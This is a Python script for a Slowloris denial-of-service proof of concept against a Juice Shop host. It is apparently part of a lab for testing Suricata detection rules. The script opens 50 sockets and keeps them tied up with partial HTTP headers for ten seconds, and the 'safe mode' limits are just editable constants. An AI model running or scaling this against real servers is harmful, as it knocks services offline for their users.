#!/usr/bin/env python3
"""DoS - Slowloris attack against Juice Shop (safe: limited to 50 connections, 10s duration)."""

import socket
import time
import sys
import random

TARGET_HOST = "juice-shop"
TARGET_PORT = 3000
MAX_CONNECTIONS = 50
DURATION = 10  # seconds


def create_socket():
    """Create a socket and send partial HTTP headers."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((TARGET_HOST, TARGET_PORT))
        # Send partial HTTP request
        s.send(f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {TARGET_HOST}\r\n".encode())
        s.send("User-Agent: Mozilla/5.0 (Slowloris PoC)\r\n".encode())
        s.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
        return s
    except Exception:
        s.close()
        return None


def main():
    print("[*] DoS - Slowloris PoC (SAFE MODE)")
    print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Max connections: {MAX_CONNECTIONS}")
    print(f"[*] Duration: {DURATION}s")
    print()
    print("[!] This is a LIMITED demo - not a real DoS attack")
    print()

    sockets = []

    # Phase 1: Open initial connections
    print("[*] Phase 1: Opening connections...")
    for i in range(MAX_CONNECTIONS):
        s = create_socket()
        if s:
            sockets.append(s)
    print(f"[+] Opened {len(sockets)} connections")

    # Phase 2: Keep connections alive by sending partial headers
    print(f"[*] Phase 2: Keeping connections alive for {DURATION}s...")
    start = time.time()
    keep_alive_count = 0

    while time.time() - start < DURATION:
        elapsed = time.time() - start
        print(f"  [{elapsed:5.1f}s] Active connections: {len(sockets)}", end="")

        # Send keep-alive header to each socket
        still_alive = []
        for s in sockets:
            try:
                header = f"X-Slowloris-{random.randint(0, 99999)}: {random.randint(0, 99999)}\r\n"
                s.send(header.encode())
                still_alive.append(s)
                keep_alive_count += 1
            except Exception:
                pass  # Connection dropped

        sockets = still_alive
        print(f" | Keep-alives sent: {keep_alive_count}")

        # Re-open dropped connections
        while len(sockets) < MAX_CONNECTIONS:
            s = create_socket()
            if s:
                sockets.append(s)
            else:
                break

        time.sleep(1)

    # Cleanup
    print()
    print("[*] Phase 3: Closing all connections...")
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    total_elapsed = time.time() - start
    print(f"[+] Slowloris attack completed")
    print(f"[+] Duration: {total_elapsed:.1f}s")
    print(f"[+] Total keep-alive headers sent: {keep_alive_count}")
    print(f"[+] Peak connections: {MAX_CONNECTIONS}")
    print()
    print("[*] Attack complete. Check Suricata alerts for SID 100009.")

if __name__ == "__main__":
    main()
